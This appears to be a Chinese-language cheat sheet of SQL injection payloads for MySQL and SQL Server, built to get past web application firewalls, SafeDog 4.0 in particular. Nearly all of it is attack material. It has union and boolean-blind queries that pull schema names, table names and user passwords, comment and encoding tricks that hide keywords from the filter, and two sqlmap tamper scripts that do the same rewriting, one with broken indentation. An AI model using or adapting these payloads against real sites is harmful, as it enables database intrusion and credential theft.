Payload-1：
一： and 1=1 和 and 1=2  绕过
字符型+Mysql： 

' and 1=1--+
' and 1=2--+

' and %26%26 True--+
' and %26%26 False--+


二：order by 绕过
字符型+Mysql：
 ' /*!order*//**//*!by*/ 1--+
 
 ' order/*!60000ghtwf01*/by 1--+
 
 
三： Union Select绕过
 字符型+Mysql：
 ' union/*!60000ghtwf01*/select 1,2,3--+
 
 ' union/*!60000ghtwf01*/select 1,database(),3--+
 ' union/*!60000ghtwf01*/select 1,(database/**/()),3--+
 
 
 四：schema_name 绕过
字符型+Mysql：
' union/*!60000ghtwf01*/select 1, (select group_concat(/*!schema_name*/) from information_schema.schemata),3--+


五：table_name 绕过 
字符型+Mysql：
' union/*!60000ghtwf01*/select 1,(select group_concat(/*!table_name*/) from information_schema.tables where table_schema='security'),3--+


六： column_name 绕过
字符型+Mysql：
' union/*!60000ghtwf01*/select 1,(select group_concat(/*!column_name*/) from information_schema.columns where table_schema='security' %26%26 table_name=0x7573657273),3--+


七：绕过与 from 的结合查询字段内容
字符型+Mysql：
' union/*!60000ghtwf01*/select 1, (select group_concat(username,0x7e,password,0x7e) from. users),3--+



布尔盲注 --Mysql+字符型
查询数据库名长度：
' %26%26 length(database/**/())=8--+

查询第一个数据库名的第一个字母，过滤了 ascii()，使用 hex()
%27%20%26%26%20(hex(substr((select%20concat(/*!schema_name*/)%20from%20information_schema.schema
ta%20limit%200,1),1,1))=69)%20--+

查询表名的第一个字母，注意这里数据库名需要十六进制编码
%27%20%26%26%20(hex(substr((select%20concat(/*!table_name*/)%20from%20information_schema.tables%
20where%20/*!table_schema*/=0x7365637572697479%20limit%200,1),1,1))=65)%20--+

查询列名的第一个字母
%27%20%26%26%20(hex(substr((select%20concat(/*!column_name*/)%20from%20information_schema.column
s%20where%20table_schema=0x7365637572697479%20%26%26%20table_name=0x7573657273%20limit%200,1),1,1))=
69)%20--+

查询字段第一个字母，限制了 select 与 from 结合使用 from.
%27%20%26%26%20(hex(substr((select%20username%20from.%20users%20limit%200,1),1,1))=74)%20--+



时间盲注
过滤了 sleep() 函数，使用 benchmark() 函数


奇怪的Payload
字符型+Mysql
爆数据库名：
'-ghtwf01()--+
 

 
Payload-2：
 安全狗-4.0
 字符型+Mysql
 一： and 1=1 
 常规：' and 1=1-- -
 
 逻辑&：
 ' %26 1-- -
  ' %26 0-- -
 ' %26 true-- -
 ' %26 false-- -
  
 xor绕过：
 ' Xor 1-- -
 ' Xor true-- -
 
 ' or length(database()=4)-- -
 ' %26 (length(database/**/())=4)-- -
 ' %26 (ascii(@@version)=53)-- -
 
 ' or -1=-1-- -
 ' or -0=-0-- -
 ' or /*!1=1*/-- -
 
 and 和 or绕过
 /*!11440OR*/
 /*!11440AND*/
 
 order by 绕过
 order%23%0aby
 ' /*!order /*!/*/**/by*/1-- -
 ' /*!order /*/*%/**/by*/1-- -
 ' /*!order /*!/*/**//**/by*/1-- -
 ' /*!order /*!/*/**//*/**/by*/1-- -
  /*!11440order*/
  
  union select绕过
  ' /*!union/*!/*/**/*/select/**/1,2,3-- -
 ' /*!11440union*/ /*!select/*!/*/**/*/-- -
 
 系统函数绕过
 version () #直接空格
 user%0a() #这个地方%0a~%20有很多，类似绕过空格
 database/**/() #注释符
 user/*!*/() #内敛注释

 函数名绕过
 /*!extractvalue/*!/*/**/*/
 /*!updatexml/*!/*/**/*/
 
 information_schema.*绕过
 Mysql>5.6.x Mysql>5.6.xmysql 库里增添了两个新表， 库里增添了两个新表，innodb_index_stats 和和 innodb_table_stats 这两个表是数据库自动设置的。 这两个表是数据库自动设置的。
 存储数据库和对应的数据表，安全狗没有对这两个表做检测

万能payload
#针对两个关键字连用或者函数 
/*!union/*!/*/**/*/select/**/
/*!database/*!/*/**/*/()/**/
/*!order/*!/*/**/*/by/**/
#针对单独的一个关键字 
/*!union/*!/*/**/*/ 
/*!updatexml/*!/*/**/*/ 
/*!extractvalue/*!/*/**/*/

tamper-1
#!/usr/bin/env python
# -*- coding: UTF-8 -*-
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING

__priority__ = PRIORITY.LOWEST

def dependencies():
    pass

def tamper(payload, **kwargs):

   if payload:
      payload=payload.replace("=","/*!*/=/*!*/")
      payload=payload.replace("ORDER","/*!ORDER/*!/*/**/*/")
      payload=payload.replace("AND","/*!AND/*!/*/**/*/")
      payload=payload.replace("OR","/*!OR/*!/*/**/*/")
      payload=payload.replace("UNION","/*!UNION/*!/*/**/*/")
      payload=payload.replace("SELECT","/*!SELECT/*!/*/**/*/")
      payload=payload.replace("USER()","/*!USER/*!/*/**/*/()/**/")
      payload=payload.replace("DATABASE()","/*!DATABASE/*!/*/**/*/()/**/")
      payload=payload.replace("VERSION()","/*!VERSION/*!/*/**/*/()/**/")
      payload=payload.replace("SESSION_USER()","/*!SESSION_USER/*!/*/**/*/()/**/")
      payload=payload.replace("EXTRACTVALUE","/*!EXTRACTVALUE/*!/*/**/*/()/**/")
      payload=payload.replace("UPDATEXML","/*!UPDATEXML/*!/*/**/*/")

 return payload
 
 
 tamper -2 
# coding=UTF-8 
# Desc: sqlmap_bypass_安全狗_tamper 
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING
__priority__ = PRIORITY.LOW
def dependencies():
pass
def tamper(payload, **kwargs):

if payload:
payload=payload.replace(" ","/*!*/")
payload=payload.replace("=","/*!*/=/*!*/")
payload=payload.replace("AND","/*!*/AND/*!*/")
payload=payload.replace("UNION","union/*!88888cas*/")
payload=payload.replace("#","/*!*/#")
payload=payload.replace("USER()","USER/*!()*/")
payload=payload.replace("DATABASE()","DATABASE/*!()*/")
payload=payload.replace("--","/*!*/--")
payload=payload.replace("SELECT","/*!88888cas*/select")
payload=payload.replace("FROM","/*!99999c*//*!99999c*/from")
print payload

return payload
 
 
Payload-3
数字型+Mysql： 

一.union select绕过
1. SE/**/ LECT
2.union S%E%L%E%C%T 1,2,3,4,5 F%R%O%M admin　
3.id=(-1) UNION (SEL%E%CT 1,username,3,4,passwd,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from (admin))  
4.UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g JOIN (SELECT 8)h JOIN (SELECT 9)i JOIN (SELECT 10)j JOIN (SELECT 11)k JOIN (SELECT 12)l JOIN (SELECT 13)m JOIN (SELECT 14)n JOIN (SELECT 15)o JOIN (SELECT 16)p JOIN (SELECT 17)q JOIN (SELECT 18)r JOIN (SELECT 19)s)#

二. %00绕过
http://url/xxx.asp?id=1
变换成 http://url/xxx.asp?xxx.com=%00.&id=1 -->sqlmap



Payload-4
方法一：
%00绕过
xxx.asp?xxx=%00&id=sql 
xxx.asp?xxx=%00.&id=sql

方法二：
%绕过
在被过滤的关键词中添加 %

方法二：
%a绕过
id=1 un%aion sel%aect 1,2,3,4 fr%aom admin 


Payload-5
SQLServer + 数字型
a%nd exists (select * f%rom Manage_User)




